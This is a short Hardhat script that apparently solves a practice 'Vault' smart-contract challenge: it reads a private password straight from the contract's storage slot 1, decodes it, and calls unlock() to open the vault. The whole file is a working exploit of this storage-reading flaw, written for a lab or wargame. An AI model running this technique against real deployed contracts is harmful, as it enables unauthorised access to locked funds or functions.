import { ethers } from "hardhat";

async function main(){
    // random player address
    let player = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
    // vault contract address
    let address_a = "0x59b670e9fA9D0A427751Af201D676719a970857b";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Vault", address_a, signer);

    let password = await ethers.provider.getStorageAt(address_a,1);
    // vault password is stored in slot 1, we can directly read the password even though it is private variable
    let decrypted_msg = ethers.utils.parseBytes32String(password)
    console.log(decrypted_msg);

    // simply call function to unlock vault
    await contract_a.unlock(password);
    // verify lock is indeed unlocked
    console.log(await contract_a.locked());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
